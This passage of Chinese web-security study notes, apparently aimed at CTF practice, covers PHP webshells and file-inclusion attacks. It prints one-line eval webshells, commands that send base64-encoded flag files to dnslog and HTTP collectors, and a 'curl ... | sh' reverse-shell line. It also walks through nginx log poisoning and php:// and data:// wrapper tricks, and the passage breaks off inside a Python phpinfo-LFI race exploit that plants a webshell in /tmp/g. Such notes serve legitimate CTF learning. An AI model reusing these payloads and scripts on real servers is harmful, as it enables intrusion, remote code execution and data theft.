class="string">&quot;chihuo&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">/*$zhangsan = new test();</span></span><br><span class="line"><span class="comment">    $zhangsan-&gt;name=&quot;张三&quot;;   //引用它的属性（name）</span></span><br><span class="line"><span class="comment">    $zhangsan-&gt;SetAge(18);      //调用他的年龄*/</span></span><br><span class="line">    test::<span class="title function_ invoke__">play</span>();</span><br><span class="line">    <span class="comment">//echo $zhangsan-&gt;getAge();</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20221003130828898.png" alt="image-20221003130828898"></p>
<p>这时为什么能直接执行呢？</p>
<p>这种情况下不需要new函数来实例化，因为它是一个标识的一个static代表着它是一个静态方法不需要实例化就可以直接用类名来执行</p>
<p>就是两个冒号：：</p>
<h2 id="php的代码执行后门">php的代码执行后门</h2>
<h3 id="一句话木马">一句话木马</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">eval($_POST[1]);</span><br><span class="line">?&gt; //蚁剑连接</span><br></pre></td></tr></table></figure>
<h3 id="GET-POST转接头">_GET_POST转接头</h3>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]);</span><br><span class="line"><span class="variable">$_GET</span>[<span class="number">1</span>]=<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;eval(<span class="subst">$_POST</span>[1]);&quot;</span>);</span><br><span class="line"><span class="number">1</span>=<span class="title function_ invoke__">phpinfo</span>() ;</span><br><span class="line"><span class="string">&quot;eval(&#x27;phpinfo();&#x27;);&quot;</span></span><br><span class="line">    <span class="meta">?&gt;</span><span class="comment">//蚁剑连接				即</span></span><br><span class="line">    </span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">?<span class="number">1</span>=<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">2</span>]);</span><br></pre></td></tr></table></figure>
<h3 id="不回显">不回显</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl ``xxxxxxxx</span><br></pre></td></tr></table></figure>
<p>没办法直接看到回显可以使用写文件的方式将结果写到浏览器可以读取的位置，然后访问url+txt</p>
<p>可以用&gt;写入</p>
<p>dns通道</p>
<p><a target="_blank" rel="noopener" href="http://dnslog.cn/">http://dnslog.cn/</a></p>
<p>当文件按过长无法全部会带，使用sed -n命令</p>
<p>可以使用</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=<span class="string">&#x27;sed -n &quot;3,4p&quot;fla?.php|base64&#x27;</span>;curl $&#123;a:<span class="number">0</span>:<span class="number">10</span>&#125;.m1207r.dnslog.cn<span class="comment">//从0开始截取10个然后再从10开始</span></span><br></pre></td></tr></table></figure>
<p>当dnslog被过滤时，可以使用</p>
<p>https通道</p>
<p><a target="_blank" rel="noopener" href="https://requestrepo.com/#/">Dashboard - requestrepo.com</a></p>
<p><a target="_blank" rel="noopener" href="https://pipedream.com">https://pipedream.com</a></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST --data a=&#x27;cat ./flag.php&#x27; http://xxx.com #POST</span><br><span class="line">curl http://xxx.com/?a=&#x27;whoami&#x27; #get</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash">curl https://your-shell.com/120.55.103.132:6666 |sh</span></span><br></pre></td></tr></table></figure>
<p>以及ctfshow专用反弹shell</p>
<p>时间盲注</p>
<p>盲猜flag</p>
<p>长度限制下的命令执行</p>
<h1>php的文件包含</h1>
<h2 id="文件包含的本质">文件包含的本质</h2>
<p>指定一个文件 ，用函数作为接口调用</p>
<h2 id="可移植性">可移植性</h2>
<p>文件包含，是可以在代码中的任意位置包含的。并不是一定非要是文件头包含</p>
<p>包含的内容，可以有php代码，也可以没有php代码（）会默认txt文本输出，包含后。会从磁盘读取这个文件所有的内容，并把读取到的内容插入到当前包含代码的位置</p>
<p>eval和文件包含的共同的区别</p>
<p>都可以执行php代码</p>
<h2 id="文件包含的常见函数">文件包含的常见函数</h2>
<p>include仅仅是包含，包含不到不影响后续执</p>
<p>require必须包含成功，包含不到就报错不再执行</p>
<p>include_once包含一次，再次包含同样的文件不再重复包含</p>
<p>require_once同上</p>
<h2 id="伪协议">伪协议</h2>
<h3 id="计算机中的伪协议">计算机中的伪协议</h3>
<p><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20220930212615075.png" alt="image-20220930212615075"></p>
<h3 id="php中的伪协议">php中的伪协议</h3>
<p>Linux php中可以自己计算目录，可以存在虚拟目录…/</p>
<p><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20220930213026839.png" alt="image-20220930213026839"></p>
<h4 id="file协议">file协议</h4>
<p><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20220930214345069.png" alt="image-20220930214345069"></p>
<p>第四行如果</p>
<p>file=A?B:C</p>
<p>A成立返回B不成立返回C</p>
<h4 id="HTTP协议">HTTP协议</h4>
<p>可以远程访问</p>
<h5 id="请求头">请求头</h5>
<h6 id="Referer">Referer</h6>
<p>服务器判断客户端来自那个网页的请求头</p>
<h6 id="UA">UA</h6>
<p>服务器了解客户端的浏览器</p>
<h6 id="XFF">XFF</h6>
<p>真实IP</p>
<h4 id="ftp协议">ftp协议</h4>
<p>和http协议类似，可以访问ftp服务器上的文件，如果支持匿名</p>
<h4 id="php协议">php协议</h4>
<p><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20220930215516103.png" alt="image-20220930215516103"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?a=php:<span class="comment">//input</span></span><br><span class="line"><span class="comment">//直接发包即可</span></span><br></pre></td></tr></table></figure>
<p>在BP中Change request method 可以GET转POST</p>
<img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20220930215902123.png"/>
<h4 id="php-filter">php://filter</h4>
<p>是一种原封装器</p>
<p>参数</p>
<table>
<thead>
<tr>
<th>名称</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td><em>resource=&lt;要过滤的数据流&gt;</em></td>
<td>这个参数是必须的。它指定了你要筛选过滤的数据流。</td>
</tr>
<tr>
<td><em>read=&lt;读链的筛选列表&gt;</em></td>
<td>该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。</td>
</tr>
<tr>
<td><em>write=&lt;写链的筛选列表&gt;</em></td>
<td>该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。</td>
</tr>
<tr>
<td><em>&lt;；两个链的筛选列表&gt;</em></td>
<td>任何没有以 <em>read=</em> 或 <em>write=</em> 作前缀 的筛选器列表会视情况应用于读或写链。</td>
</tr>
</tbody>
</table>
<p>简言之，resource是数据来源，write写入，read读取</p>
<h4 id="data协议">data协议</h4>
<p>可以直接执行php指令</p>
<p><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20220930235559600.png" alt="image-20220930235559600"></p>
<p><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20221001000012084.png" alt="image-20221001000012084"></p>
<p><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20221001000023774.png" alt="image-20221001000023774"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=data:<span class="comment">//text/plain,&lt;?php phpinfo();?&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="rot13绕过">rot13绕过</h4>
<p>两次rot13编码会变回原来的值</p>
<p>file=php://filter/write=string.rot13/resource=1.php</p>
<h1>文件包含高级利用</h1>
<h2 id="文件包含可控点">文件包含可控点</h2>
<p>文件名可控</p>
<p>后缀可控</p>
<h2 id="文件名可控">文件名可控</h2>
<p>意味着可以控制协议头</p>
<p>这时候可以优先使用data协议</p>
<h2 id="后缀可控">后缀可控</h2>
<p>如果后缀可控的情况下，可以考虑路径跳转，参考file协议</p>
<p>(一些题后缀可控，可以通过虚拟目录的手法，跳转目录，实现任意文件包含)</p>
<h3 id="虚拟目录做跳转">虚拟目录做跳转</h3>
<p><img src="C:%5CUsers%5C29506%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221001151304917.png" alt="image-20221001151304917"></p>
<p>直接file=…/…/…/</p>
<h3 id="nginx日志包含">nginx日志包含</h3>
<p>nignx默认日志保存路径为/var/log/nginx/access.log</p>
<p>里面会保存我们访问的user-agent</p>
<p>如果我们的user-agent可控，那么就是可以污染到access.log日志文件</p>
<p>然后包含日志文件就可以实现代码执行</p>
<p><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20221001155103172.png" alt="image-20221001155103172"></p>
<p>这里我们要使用user-agent, 将恶意代码写到里面，如果是其他方式包含代码将被编码导致无法执行</p>
<p><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20221001155828273.png" alt="image-20221001155828273"></p>
<p>get发送file=…/…/log/nginx/access.log执行日志里的恶意文件</p>
<img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20221001160328396.png"/>
<p>当php语法在双引号中的符号需要转义，否则判断为空即：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&lt;?php eval(<span class="subst">$_POST</span>[1]);?&gt;&quot;</span> = <span class="meta">&lt;?php</span> <span class="keyword">eval</span>();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>这时候我们可以把$符号进行\转义</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(\<span class="variable">$_POST</span>[<span class="number">1</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="临时文件包含">临时文件包含</h3>
<p>在上传</p>
<p>upload_progress文件包含</p>
<p>php的session也可以保留我们的恶意代码，只要能找到sess文件的</p>
<p><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20221005213255657.png" alt="image-20221005213255657"></p>
<p>phpinfo(); 竞争上传，这里有个python2的脚本</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python </span></span><br><span class="line">import sys</span><br><span class="line">import threading</span><br><span class="line">import socket</span><br><span class="line"></span><br><span class="line">def <span class="title function_ invoke__">setup</span>(host, port):</span><br><span class="line">    TAG=<span class="string">&quot;Security Test&quot;</span></span><br><span class="line">    PAYLOAD=<span class="string">&quot;&quot;</span><span class="string">&quot;%s\r</span></span><br><span class="line"><span class="string">&lt;?php file_put_contents(&#x27;/tmp/g&#x27;, &#x27;&lt;?=eval(<span class="subst">$_REQUEST</span>[1])?&gt;&#x27;)?&gt;\r&quot;</span><span class="string">&quot;&quot;</span> % TAG</span><br><span class="line">    REQ1_DATA=<span class="string">&quot;&quot;</span><span class="string">&quot;-----------------------------7dbff1ded0714\r</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name=&quot;</span>dummyname<span class="string">&quot;; filename=&quot;</span>test.txt<span class="string">&quot;\r</span></span><br><span class="line"><span class="string">Content-Type: text/plain\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">%s</span></span><br><span class="line"><span class="string">-----------------------------7dbff1ded0714--\r&quot;</span><span class="string">&quot;&quot;</span> % PAYLOAD</span><br><span class="line">    padding=<span class="string">&quot;A&quot;</span> * <span class="number">5000</span></span><br><span class="line">    REQ1=<span class="string">&quot;&quot;</span><span class="string">&quot;POST /phpinfo.php?a=&quot;</span><span class="string">&quot;&quot;</span>+padding+<span class="string">&quot;&quot;</span><span class="string">&quot; HTTP/1.1\r</span></span><br><span class="line"><span class="string">Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie=&quot;</span><span class="string">&quot;&quot;</span>+padding+<span class="string">&quot;&quot;</span><span class="string">&quot;\r</span></span><br><span class="line"><span class="string">HTTP_ACCEPT: &quot;</span><span class="string">&quot;&quot;</span> + padding + <span class="string">&quot;&quot;</span><span class="string">&quot;\r</span></span><br><span class="line"><span class="string">HTTP_USER_AGENT: &quot;</span><span class="string">&quot;&quot;</span>+padding+<span class="string">&quot;&quot;</span><span class="string">&quot;\r</span></span><br><span class="line"><span class="string">HTTP_ACCEPT_LANGUAGE: &quot;</span><span class="string">&quot;&quot;</span>+padding+<span class="string">&quot;&quot;</span><span class="string">&quot;\r</span></span><br><span class="line"><span class="string">HTTP_PRAGMA: &quot;</span><span class="string">&quot;&quot;</span>+padding+<span class="string">&quot;&quot;</span><span class="string">&quot;\r</span></span><br><span class="line"><span class="string">Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\r</span></span><br><span class="line"><span class="string">Content-Length: %s\r</span></span><br><span class="line"><span class="string">Host: %s\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">%s&quot;</span><span class="string">&quot;&quot;</span> %(<span class="title function_ invoke__">len</span>(REQ1_DATA),host,REQ1_DATA)</span><br><span class="line">    <span class="comment">#modify this to suit the LFI script   </span></span><br><span class="line">    LFIREQ=<span class="string">&quot;&quot;</span><span class="string">&quot;GET /lfi.php?file=%s HTTP/1.1\r</span></span><br><span class="line"><span class="string">User-Agent: Mozilla/4.0\r</span></span><br><span class="line"><span class="string">Proxy-Connection: Keep-Alive\r</span></span><br><span class="line"><span class="string">Host: %s\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">&quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> (REQ1, TAG, LFIREQ)</span><br><span class="line"></span><br><span class="line">def <span class="title function_ invoke__">phpInfoLFI</span>(host, port, phpinforeq, offset, lfireq, tag):</span><br><span class="line">    s = socket.<span class="title function_ invoke__">socket</span>(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s2 = socket.<span class="title function_ invoke__">socket</span>(socket.AF_INET, socket.SOCK_STREAM)    </span><br><span class="line"></span><br><span class="line">    s.<span class="title function_ invoke__">connect</span>((host, port))</span><br><span class="line">    s2.<span class="title function_ invoke__">connect</span>((host, port))</span><br><span class="line"></span><br><span class="line">    s.<span class="title function_ invoke__">send</span>(phpinforeq)</span><br><span class="line">    d = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="title function_ invoke__">len</span>(d) &lt; offset:</span><br><span class="line">        d += s.<span class="title function_ invoke__">recv</span>(offset)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        i = d.<span class="title function_ invoke__">index</span>(<span class="string">&quot;[tmp_name] =&amp;gt; &quot;</span>)</span><br><span class="line">        <span class="function"><span class="keyword">fn</span> = <span class="title">d</span>[<span class="title">i</span>+17:<span class="title">i</span>+31]</span></span><br><span class="line"><span class="function">    <span class="title">except</span> <span class="title">ValueError</span>:</span></span><br><span class="line"><span class="function">        <span class="title">return</span> <span class="title">None</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">    <span class="title">s2</span>.<span class="title">send</span>(<span class="params">lfireq % (<span class="params">fn, host</span>)</span>)</span></span><br><span class="line"><span class="function">    <span class="title">d</span> = <span class="title">s2</span>.<span class="title">recv</span>(<span class="params"><span class="number">4096</span></span>)</span></span><br><span class="line"><span class="function">    <span class="title">s</span>.<span class="title">close</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    <span class="title">s2</span>.<span class="title">close</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">    <span class="title">if</span> <span class="title">d</span>.<span class="title">find</span>(<span class="params">tag</span>) != -1:</span></span><br><span class="line"><span class="function">        <span class="title">return</span> <span class="title">fn</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">counter</span>=0</span></span><br><span class="line"><span class="function"><span class="title">class</span> <span class="title">ThreadWorker</span>(<span class="params">threading.Thread</span>):</span></span><br><span class="line"><span class="function">    <span class="title">def</span> <span class="title">__init__</span>(<span class="params"><span class="built_in">self</span>, e, l, m, *args</span>):</span></span><br><span class="line"><span class="function">        <span class="title">threading</span>.<span class="title">Thread</span>.<span class="title">__init__</span>(<span class="params"><span class="built_in">self</span></span>)</span></span><br><span class="line"><span class="function">        <span class="title">self</span>.<span class="title">event</span> = <span class="title">e</span></span></span><br><span class="line"><span class="function">        <span class="title">self</span>.<span class="title">lock</span> =  <span class="title">l</span></span></span><br><span class="line"><span class="function">        <span class="title">self</span>.<span class="title">maxattempts</span> = <span class="title">m</span></span></span><br><span class="line"><span class="function">        <span class="title">self</span>.<span class="title">args</span> = <span class="title">args</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">    <span class="title">def</span> <span class="title">run</span>(<span class="params"><span class="built_in">self</span></span>):</span></span><br><span class="line"><span class="function">        <span class="title">global</span> <span class="title">counter</span></span></span><br><span class="line"><span class="function">        <span class="title">while</span> <span class="title">not</span> <span class="title">self</span>.<span class="title">event</span>.<span class="title">is_set</span>(<span class="params"></span>):</span></span><br><span class="line"><span class="function">            <span class="title">with</span> <span class="title">self</span>.<span class="title">lock</span>:</span></span><br><span class="line"><span class="function">                <span class="title">if</span> <span class="title">counter</span> &gt;= <span class="title">self</span>.<span class="title">maxattempts</span>:</span></span><br><span class="line"><span class="function">                    <span class="title">return</span></span></span><br><span class="line"><span class="function">                <span class="title">counter</span>+=1</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">            <span class="title">try</span>:</span></span><br><span class="line"><span class="function">                <span class="title">x</span> = <span class="title">phpInfoLFI</span>(<span class="params">*<span class="built_in">self</span>.args</span>)</span></span><br><span class="line"><span class="function">                <span class="title">if</span> <span class="title">self</span>.<span class="title">event</span>.<span class="title">is_set</span>(<span class="params"></span>):</span></span><br><span class="line"><span class="function">                    <span class="title">break</span>                </span></span><br><span class="line"><span class="function">                <span class="title">if</span> <span class="title">x</span>:</span></span><br><span class="line"><span class="function">                    <span class="title">print</span> &quot;\<span class="title">nGot</span> <span class="title">it</span>! <span class="title">Shell</span> <span class="title">created</span> <span class="title">in</span> /<span class="title">tmp</span>/<span class="title">g</span>&quot;</span></span><br><span class="line"><span class="function">                    <span class="title">self</span>.<span class="title">event</span>.<span class="title">set</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">                    </span></span><br><span class="line"><span class="function">            <span class="title">except</span> <span class="title">socket</span>.<span class="title">error</span>:</span></span><br><span class="line"><span class="function">                <span class="title">return</span></span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">def</span> <span class="title">getOffset</span>(<span class="params">host, port, phpinforeq</span>):</span></span><br><span class="line"><span class="function">    &quot;&quot;&quot;<span class="title">Gets</span> <span class="title">offset</span> <span class="title">of</span> <span class="title">tmp_name</span> <span class="title">in</span> <span class="title">the</span> <span class="title">php</span> <span class="title">output</span>&quot;&quot;&quot;</span></span><br><span class="line"><span class="function">    <span class="title">s</span> = <span class="title">socket</span>.<span class="title">socket</span>(<span class="params">socket.AF_INET, socket.SOCK_STREAM</span>)</span></span><br><span class="line"><span class="function">    <span class="title">s</span>.<span class="title">connect</span>(<span class="params">(<span class="params">host,port</span>)</span>)</span></span><br><span class="line"><span class="function">    <span class="title">s</span>.<span class="title">send</span>(<span class="params">phpinforeq</span>)</span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function">    <span class="title">d</span> = &quot;&quot;</span></span><br><span class="line"><span class="function">    <span class="title">while</span> <span class="title">True</span>:</span></span><br><span class="line"><span class="function">        <span class="title">i</span> = <span class="title">s</span>.<span class="title">recv</span>(<span class="params"><span class="number">4096</span></span>)</span></span><br><span class="line"><span class="function">        <span class="title">d</span>+=<span class="title">i</span>        </span></span><br><span class="line"><span class="function">        <span class="title">if</span> <span class="title">i</span> == &quot;&quot;:</span></span><br><span class="line"><span class="function">            <span class="title">break</span></span></span><br><span class="line"><span class="function">        # <span class="title">detect</span> <span class="title">the</span> <span class="title">final</span> <span class="title">chunk</span></span></span><br><span class="line"><span class="function">        <span class="title">if</span> <span class="title">i</span>.<span class="title">endswith</span>(<span class="params"><span class="string">&quot;0\r\n\r\n&quot;</span></span>):</span></span><br><span class="line"><span class="function">            <span class="title">break</span></span></span><br><span class="line"><span class="function">    <span class="title">s</span>.<span class="title">close</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    <span class="title">i</span> = <span class="title">d</span>.<span class="title">find</span>(<span class="params"><span class="string">&quot;[tmp_name] =&amp;gt; &quot;</span></span>)</span></span><br><span class="line"><span class="function">    <span class="title">if</span> <span class="title">i</span> == -1:</span></span><br><span class="line"><span class="function">        <span class="title">raise</span> <span class="title">ValueError</span>(<span class="params"><span class="string">&quot;No php tmp_name in phpinfo output&quot;</span></span>)</span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function">    <span class="title">print</span> &quot;<span class="title">found</span> %<span class="title">s</span> <span class="title">at</span> %<span class="title">i</span>&quot; % (<span class="params">d[i:i+<span class="number">10</span>],i</span>)</span></span><br><span class="line"><span class="function">    # <span class="title">padded</span> <span class="title">up</span> <span class="title">a</span> <span class="title">bit</span></span></span><br><span class="line"><span class="function">    <span class="title">return</span> <span class="title">i</span>+256</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">def</span> <span class="title">main</span>(<span class="params"></span>):</span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function">    <span class="title">print</span> &quot;<span class="title">LFI</span> <span class="title">With</span> <span class="title">PHPInfo</span>(<span class="params"></span>)&quot;</span></span><br><span class="line"><span class="function">    <span class="title">print</span> &quot;-=&quot; * 30</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">    <span class="title">if</span> <span class="title">len</span>(<span class="params">sys.argv</span>) &lt; 2:</span></span><br><span class="line"><span class="function">        <span class="title">print</span> &quot;<span class="title">Usage</span>: %<span class="title">s</span> <span class="title">host</span> [<span class="title">port</span>] [<span class="title">threads</span>]&quot; % <span class="title">sys</span>.<span class="title">argv</span>[0]</span></span><br><span class="line"><span class="function">        <span class="title">sys</span>.<span class="title">exit</span>(<span class="params"><span class="number">1</span></span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">    <span class="title">try</span>:</span></span><br><span class="line"><span class="function">        <span class="title">host</span> = <span class="title">socket</span>.<span class="title">gethostbyname</span>(<span class="params">sys.argv[<span class="number">1</span>]</span>)</span></span><br><span class="line"><span class="function">    <span class="title">except</span> <span class="title">socket</span>.<span class="title">error</span>, <span class="title">e</span>:</span></span><br><span class="line"><span class="function">        <span class="title">print</span> &quot;<span class="title">Error</span> <span class="title">with</span> <span class="title">hostname</span> %<span class="title">s</span>: %<span class="title">s</span>&quot; % (<span class="params">sys.argv[<span class="number">1</span>], e</span>)</span></span><br><span class="line"><span class="function">        <span class="title">sys</span>.<span class="title">exit</span>(<span class="params"><span class="number">1</span></span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">    <span class="title">port</span>=80</span></span><br><span class="line"><span class="function">    <span class="title">try</span>:</span></span><br><span class="line"><span class="function">        <span class="title">port</span> = <span class="title">int</span>(<span class="params">sys.argv[<span class="number">2</span>]</span>)</span></span><br><span class="line"><span class="function">    <span class="title">except</span> <span class="title">IndexError</span>:</span></span><br><span class="line"><span class="function">        <span class="title">pass</span></span></span><br><span class="line"><span class="function">    <span class="title">except</span> <span class="title">ValueError</span>, <span class="title">e</span>:</span></span><br><span class="line"><span class="function">        <span class="title">print</span> &quot;<span class="title">Error</span> <span class="title">with</span> <span class="title">port</span> %<span class="title">d</span>: %<span class="title">s</span>&quot; % (<span class="params">sys.argv[<span class="number">2</span>], e</span>)</span></span><br><span class="line"><span class="function">        <span class="title">sys</span>.<span class="title">exit</span>(<span class="params"><span class="number">1</span></span>)</span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function">    <span class="title">poolsz</span>=10</span></span><br><span class="line"><span class="function">    <span class="title">try</span>:</span></span><br><span class="line"><span class="function">        <span class="title">poolsz</span> = <span class="title">int</span>(<span class="params">sys.argv[<span class="number">3</span>]</span>)</span></span><br><span class="line"><span class="function">    <span class="title">except</span> <span class="title">IndexError</span>:</span></span><br><span class="line"><span 